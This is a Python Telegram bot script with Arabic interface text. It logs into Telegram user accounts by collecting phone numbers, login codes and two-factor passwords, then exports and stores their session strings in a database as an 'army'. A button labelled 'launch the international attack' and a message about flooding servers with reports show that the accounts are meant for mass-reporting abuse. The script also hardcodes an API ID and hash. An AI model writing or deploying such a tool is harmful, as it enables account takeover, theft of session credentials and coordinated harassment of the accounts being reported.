import os
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded
import psycopg2
from flask import Flask
from threading import Thread

# --- الإعدادات ---
BOT_TOKEN = os.getenv("TG_BOT_TOKEN")
DATABASE_URL = os.getenv("DATABASE_URL")
# الـ API ID والهاش بنحتاجهم فقط وقت إضافة "حساب مستخدم" جديد
API_ID = 26569722 
API_HASH = "90a9314c99544976451664d4c1f964fc"

bot = telebot.TeleBot(BOT_TOKEN)
server = Flask(__name__)
user_data = {}

# --- سيرفر الويب عشان ريندر ---
@server.route("/")
def home():
    return "Mikey Command Center is Running!", 200

def run_web():
    server.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))

# --- قاعدة البيانات ---
def get_db_connection():
    return psycopg2.connect(DATABASE_URL)

def init_db():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS accounts (phone TEXT PRIMARY KEY, session_string TEXT)")
    conn.commit()
    cur.close()
    conn.close()

init_db()

# --- واجهة البوت ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("➕ إضافة حساب للجيش", callback_data="add_acc"))
    markup.row(
        InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"),
        InlineKeyboardButton("📜 اللوج", callback_data="log")
    )
    markup.row(InlineKeyboardButton("☣️ شن الهجوم الدولي", callback_data="attack"))
    
    bot.reply_to(message, "🔥 **أهلاً بك في مقر مايكي للعمليات** 🔥\n\nالوضع تحت السيطرة. وش الخطوة الجاية؟", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "add_acc":
        msg = bot.edit_message_text("📱 أرسل رقم الهاتف مع المفتاح الدولي (مثال: +123456...):", call.message.chat.id, call.message.message_id)
        bot.register_next_step_handler(msg, process_phone_step)
    
    elif call.data == "stats":
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT COUNT(*) FROM accounts")
        count = cur.fetchone()[0]
        cur.close()
        conn.close()
        markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="home")]])
        bot.edit_message_text(f"📊 **قوة الجيش الحالي:**\n\nلديك `{count}` حساب مستعد لتفجير السيرفرات بالبلاغات.", call.message.chat.id, call.message.message_id, reply_markup=markup)

    elif call.data == "home":
        send_welcome(call.message)

# --- نظام سحب السيزونات (بايروجام داخلي) ---
def process_phone_step(message):
    phone = message.text.strip()
    chat_id = message.chat.id
    
    # تشغيل عميل بايروجام في الذاكرة لسحب السيزون
    client = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
    client.connect()
    
    try:
        code_info = client.send_code(phone)
        user_data[chat_id] = {'phone': phone, 'client': client, 'hash': code_info.phone_code_hash}
        msg = bot.send_message(chat_id, "📩 أرسل كود التحقق الآن:")
        bot.register_next_step_handler(msg, process_code_step)
    except Exception as e:
        bot.send_message(chat_id, f"❌ خطأ في الرقم: {e}")

def process_code_step(message):
    chat_id = message.chat.id
    code = message.text.strip()
    data = user_data.get(chat_id)
    
    try:
        client = data['client']
        client.sign_in(data['phone'], data['hash'], code)
        save_and_finish(message, client, data['phone'])
    except SessionPasswordNeeded:
        msg = bot.send_message(chat_id, "🔐 الحساب محمي بكلمة سر، أرسلها:")
        bot.register_next_step_handler(msg, process_password_step)
    except Exception as e:
        bot.send_message(chat_id, f"❌ الكود خطأ: {e}")

def process_password_step(message):
    chat_id = message.chat.id
    password = message.text.strip()
    data = user_data.get(chat_id)
    
    try:
        client = data['client']
        client.check_password(password)
        save_and_finish(message, client, data['phone'])
    except Exception as e:
        bot.send_message(chat_id, f"❌ كلمة السر خطأ: {e}")

def save_and_finish(message, client, phone):
    session_string = client.export_session_string()
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("INSERT INTO accounts (phone, session_string) VALUES (%s, %s) ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string", (phone, session_string))
    conn.commit()
    cur.close()
    conn.close()
    client.disconnect()
    bot.send_message(message.chat.id, f"✅ تم بنجاح! الحساب {phone} انضم للجيش.")
    del user_data[message.chat.id]

# --- تشغيل كل شيء ---
if __name__ == "__main__":
    # تشغيل الويب في خيط منفصل
    t = Thread(target=run_web)
    t.start()
    
    print("🚬 Mikey is checking the stash... Bot started!")
    bot.infinity_polling()
